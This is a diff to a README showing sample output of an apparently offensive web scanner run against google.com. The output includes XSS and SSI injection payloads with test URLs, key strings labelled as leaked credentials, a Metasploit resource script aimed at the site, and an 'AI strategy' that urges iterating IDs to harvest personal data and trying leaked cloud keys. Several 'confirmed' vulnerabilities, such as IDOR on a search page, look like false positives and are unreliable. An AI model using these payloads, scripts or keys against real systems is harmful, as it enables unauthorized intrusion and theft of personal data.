@@ -221,7 +221,26 @@ python cli_tool.py -t example.com -m medium -o
 # Results
 ```python
 
- [★] RISK SCORE: 100/100 (CRITICAL)
+    ███╗   ██╗███████╗████████╗      ███████╗███████╗███╗   ██╗████████╗██████╗ ██╗   ██╗
+    ████╗  ██║██╔════╝╚══██╔══╝      ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝
+    ██╔██╗ ██║█████╗     ██║   █████╗███████╗█████╗  ██╔██╗ ██║   ██║   ██████╔╝ ╚████╔╝
+    ██║╚██╗██║██╔══╝     ██║   ╚════╝╚════██║██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗  ╚██╔╝
+    ██║ ╚████║███████╗   ██║         ███████║███████╗██║ ╚████║   ██║   ██║  ██║   ██║
+    ╚═╝  ╚═══╝╚══════╝   ╚═╝         ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝
+
+      [ SYSTEM ONLINE ] |   [ GOD MODE ] |  LOKESH KUMAR
+
+--------------------------------------------------------------------------
+[10:25:41] [TARGET] google.com
+[10:25:41] [*] Profile: ADVANCE
+--------------------------------------------------------------------------
+
+⠴ Engaging google.com...
+⠇ Engaging google.com...
+
+
+
+ [★] RISK SCORE: 85/100 (CRITICAL)
 
 ----------------------------------------
 
@@ -231,9 +250,9 @@ python cli_tool.py -t example.com -m medium -o
 
 --- GEO-INTEL REPORT ---
 [+] Org: Google LLC
-[+] Country: India (IN)
+[+] Country: Singapore (SG)
 [+] ISP: Google LLC
-[COORDS] 28.6139,77.2088
+[COORDS] 1.35208,103.82
 ------------------------
 
 
@@ -246,7 +265,7 @@ python cli_tool.py -t example.com -m medium -o
 
  [*] SSL ILLUMINATOR:
    [+] Issued: WR2
-   [SCOPE] Found 137 hidden domains:
+   [SCOPE] Found 136 hidden domains:
        > *.google.com
        > *.appengine.google.com
        > *.bdn.dev
@@ -257,32 +276,11 @@ python cli_tool.py -t example.com -m medium -o
        > *.google.ca
        > *.google.cl
        > *.google.co.in
-       ...and 127 more.
+       ...and 126 more.
 
 
  [*] PASSIVE SUBDOMAINS:
-   [+] Found 189 subdomains:
-       > aarjav-b480g7k2ab9@checkout.google.com
-       > accounts.flexpack.google.com
-       > accounts.freezone.google.com
-       > accounts.google.com
-       > admin@google.com
-       > ads-compare.eem.corp.google.com
-       > adwords.google.com
-       > adwords.google.com.ar
-       > adwords.google.com.au
-       > adwords.google.com.br
-       > adwords.google.com.cn
-       > adwords.google.com.gr
-       > adwords.google.com.hk
-       > adwords.google.com.ly
-       > adwords.google.com.mx
-       > adwords.google.com.my
-       > adwords.google.com.pe
-       > adwords.google.com.ph
-       > adwords.google.com.pk
-       > adwords.google.com.ru
-       ...and 169 more.
+   [-] Passive recon failed: HTTPSConnectionPool(host='crt.sh', port=443): Read timed out. (read timeout=20)
 
 
  [*] ACTIVE SUBDOMAIN DISCOVERY:
@@ -300,12 +298,11 @@ python cli_tool.py -t example.com -m medium -o
        > api.google.com
 
 
- [*] MASS TAKEOVER SCANNER:
-   [✓] No dangling subdomains found.
-
-
  [*] DNS ZONE TRANSFER:
    [✓] DNS Secure.
+[-] CRITICAL: Nmap is not installed on the server. Please install it.
+
+
 
  [*] DEEP VULNERABILITY SCAN (LFI/CONFIG):
    [✓] No config backups exposed.
@@ -314,7 +311,6 @@ python cli_tool.py -t example.com -m medium -o
 
  [*] DIRECTORY BUSTER:
    [200] FOUND: /robots.txt
-   [200] FOUND: /dashboard
 
 
  [*] CMS HUNTER (WORDPRESS):
@@ -330,7 +326,7 @@ python cli_tool.py -t example.com -m medium -o
 
 
  [*] BROKEN LINK HIJACKING:
-   [✓] External links resolve correctly.
+   [-] BLH check failed.
 
 
  [*] FIREBASE DATABASE HUNTER:
@@ -343,7 +339,7 @@ python cli_tool.py -t example.com -m medium -o
 
 
  [*] HOST HEADER INJECTION:
-   [✓] Server ignores spoofed Host headers.
+   [-] Host injection check failed.
 
 
  [*] CRLF INJECTION (HEADER SPLITTING):
@@ -359,7 +355,7 @@ python cli_tool.py -t example.com -m medium -o
 
 
  [*] PROTOTYPE POLLUTION FUZZER:
-   [✓] Server appears resilient.
+   [-] Pollution check failed.
 
 
  [*] DESERIALIZATION SCAN:
@@ -390,36 +386,44 @@ python cli_tool.py -t example.com -m medium -o
 
 
  [*] JS MINER & DOM HUNTER:
+   [$$$] KEY LEAK (Google): AIzaSyBm7NubC-Swn1nt2nhYfxb58eCdmL2vCVU
+       └── Found in: Main HTML
+       └── STATUS: [SAFE] Restricted/Inactive
    [i] Analyzing 2 JavaScript files...
-   [⚠️] DOM RISK: Found 'innerHTML' in m=cdos,cr,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
-   [⚠️] DOM RISK: Found 'eval(' in m=cdos,cr,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
-   [⚠️] DOM RISK: Found 'location.search' in m=cdos,cr,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
-   [⚠️] DOM RISK: Found 'location.hash' in m=cdos,cr,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
-   [⚠️] DOM RISK: Found 'innerHTML' in rs=AA2YrTtMySWmY-EDOJELbz3_ueBB7lVOZQ
-   [+] Found 36 crawlable endpoints:
-       > /IN?utm_source=hp_header&utm_medium=google_ooo&utm_campaign=GS100042&hl=en-IN
-       > /ServiceLogin?hl=en&passive=true&continue=https://www.google.com/%3Fgws_rd%3Dssl&ec=futura_exp_og_so_72776762_e
-       > /_/chrome/newtab
-       > /aclk
-       > /advanced_search?hl=en-IN&fg=1
-       > /client_streamz/lens_search/lens_tool_missing_client_adapter_controller
-       > /client_streamz/lens_search/lens_tool_missing_dependencies
-       > /client_streamz/lens_search/lens_tool_missing_insertion_point
-       > /complete/s
-       > /complete/search
-       ...and 26 more.
+   [$$$] KEY LEAK (AWS): AKIABAAABJIBJJJJRJJJ
+       └── Found in: m=cdos,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
+       └── STATUS: [i] No auto-validation available.
+   [$$$] KEY LEAK (Google): AIzaSyBwQcjgmXUAsw5r4FZXO5t8_EZ_aUm_TGE
+       └── Found in: m=cdos,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
+       └── STATUS: [SAFE] Restricted/Inactive
+   [⚠️] DOM RISK: Found 'innerHTML' in m=cdos,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
+   [⚠️] DOM RISK: Found 'eval(' in m=cdos,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
+   [⚠️] DOM RISK: Found 'location.search' in m=cdos,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
+   [⚠️] DOM RISK: Found 'location.hash' in m=cdos,hsm,jsa,mb4ZUb,cEt90b,SNUn3,qddgKe,sTsDMc,dtl0hd,eHDfl,YV5bee,d,csi
+   [$$$] KEY LEAK (Google): AIzaSyCbsbvGCe7C9mCtdaTycZB2eUFuzsYKG_E
+       └── Found in: rs=AA2YrTvMeF_1CDYQne2BjPnlmkIuQqq6vg
+       └── STATUS: [SAFE] Restricted/Inactive
+   [⚠️] DOM RISK: Found 'innerHTML' in rs=AA2YrTvMeF_1CDYQne2BjPnlmkIuQqq6vg
+   [+] Found 37 crawlable endpoints.
 
 
 
- [*] API ZOMBIE (FUZZING):
-   [✓] APIs seem resilient.
+ [*] API ZOMBIE (LOGIC HUNTER):
+   [☠️] CONFIRMED BOLA/IDOR: http://google.com/history/optout?hl=en-IN&fg=2
+       > Original ID: 1 | Test ID: 2
+       > Context Match: 97% (Valid Data Structure)
+   [☠️] CONFIRMED BOLA/IDOR: http://google.com/advanced_search?hl=en-IN&fg=2
+       > Original ID: 1 | Test ID: 2
+       > Context Match: 88% (Valid Data Structure)
+   [☠️] CONFIRMED BOLA/IDOR: http://google.com/preferences?hl=en-IN&fg=2
+       > Original ID: 1 | Test ID: 2
+       > Context Match: 96% (Valid Data Structure)
 
 
  [*] DOM EXPLOIT SUGGESTIONS for innerHTML:
    [i] Manual Verification Required. Try these in Browser:
        > http://google.com#<img src=x onerror=alert(1)>
        > http://google.com?q=<svg/onload=alert(1)>
-       > http://google.com?q=<iframe src=javascript:alert(1)>
 
 
  [*] CLOUD PIERCER (SSRF SCANNER):
@@ -434,8 +438,8 @@ python cli_tool.py -t example.com -m medium -o
    [✓] No Reflected XSS found.
 
 
- [*] OS COMMAND INJECTION:
-   [✓] No OS injection.
+ [*] OS COMMAND INJECTION (SMART VERIFICATION):
+   [✓] No verified OS injection.
 
 
  [*] BACKUP FILE MINER:
@@ -447,13 +451,8 @@ python cli_tool.py -t example.com -m medium -o
 
 
  [*] IDOR PATTERN HUNTER:
-   [⚠️] POTENTIAL IDOR ENDPOINTS FOUND (10):
-       1. /services/?subid=ww-ww-et-g-awa-a-g_hpbfoot1_1!o2&utm_source=google.com&utm_medium=referral&utm_campaign=google_hpbfooter&fg=1
-       2. /history/privacyadvisor/search/unauth?utm_source=googlemenu&fg=1&cctld=com
-       3. /intl/en_in/ads/?subid=ww-ww-et-g-awa-a-g_hpafoot1_1!o2&utm_source=google.com&utm_medium=referral&utm_campaign=google_hpafooter&fg=1
-       4. /history/optout?hl=en-IN&fg=1
-       5. /websearch/?p=ws_results_help&hl=en-IN&fg=1
-       > Tip: Try changing the ID to access other users' data.
+   [⚠️] VERIFIED POTENTIAL IDOR (1):
+       1. /preferences?hl=en-IN&fg=1 (Sim: 84%)
 
 
  [*] NOSQL INJECTION SCANNER:
@@ -477,12 +476,25 @@ python cli_tool.py -t example.com -m medium -o
 
 
  [*] HTTP PARAMETER POLLUTION (HPP):
-   [✓] No obvious HPP vectors.
+   [⚠️] POTENTIAL HPP: http://google.com/history/optout?hl=en-IN&fg=1&hl=666_HPP_TEST
 
 
  [*] SSI INJECTION SCANNER:
-   [☠️] CRITICAL: SSI INJECTION FOUND!
-       > Target: http://google.com/setprefs?sig=
+[VULNERABLE] SSI Injection suspected:
+  Endpoint : /history/optout?hl=en-IN&fg=1
+  Payload  : <!--#echo var="DATE_LOCAL" -->
+  Test URL : http://google.com/history/optout?hl=<!--#echo var="DATE_LOCAL" -->
+
+[VULNERABLE] SSI Injection suspected:
+  Endpoint : /advanced_search?hl=en-IN&fg=1
+  Payload  : <!--#echo var="DATE_LOCAL" -->
+  Test URL : http://google.com/advanced_search?hl=<!--#echo var="DATE_LOCAL" -->
+
+[VULNERABLE] SSI Injection suspected:
+  Endpoint : /setprefs?sig=0_a2Ee7duj7GUDe063k3DpQcMd9EU%3D&hl=bn&source=homepage&sa=X&ved=0ahUKEwjx4dajnN2SAxUpTmwGHUZZKuwQ2ZgBCDM
+  Payload  : <!--#echo var="DATE_LOCAL" -->
+  Test URL : http://google.com/setprefs?sig=<!--#echo var="DATE_LOCAL" -->
+
 
 
  [*] XPATH INJECTION SCANNER:
@@ -520,27 +532,31 @@ python cli_tool.py -t example.com -m medium -o
 
 
  [*] WEAPONIZER:
-   [WEB] nikto -h google.com
 
 
  [*] METASPLOIT SCRIPT (RCE):
 workspace -a google.com
 db_nmap -sV google.com
-use auxiliary/scanner/http/dir_scanner
-set RHOSTS google.com
-run
 [i] Save as 'attack.rc' and run: msfconsole -r attack.rc
 
 
- [*] CORTEX AI STRATEGY (BLUEPRINT):
-   [i] Target is hardened. Recommended: Social Engineering or Phishing.
+ [*] CORTEX AI STRATEGY (VIRTUAL RED TEAM LEAD):
+   [🔥] IMMEDIATE ACTION REQUIRED (Critical Vulns Found):
+
+   [⚗️] TECH-SPECIFIC ATTACK VECTOR:
+   1. Data Harvesting: Write a script to iterate IDs (0-10000).
+   2. PII Extraction: Look for emails/phones in JSON response.
+
+   [☁️] CLOUD & API ENTRY:
+          > AWS/Google Keys: Configure CLI and try 'aws s3 ls'.
+          > Stripe/Mailgun: Check usage limits to confirm validity.
 
 ╔══════════════════════════════════════════════════════╗
 ║               MISSION DEBRIEF / SUMMARY              ║
 ╠═════════════════════════════╦════════════════════════╣
 ║ Target                      ║ google.com             ║
-║ Duration                    ║ 245.13s                ║
-║ Risk Score                  ║ 100/100                ║
+║ Duration                    ║ 363.35s                ║
+║ Risk Score                  ║ 85/100                 ║
 ╚═════════════════════════════╩════════════════════════╝
 ```
 
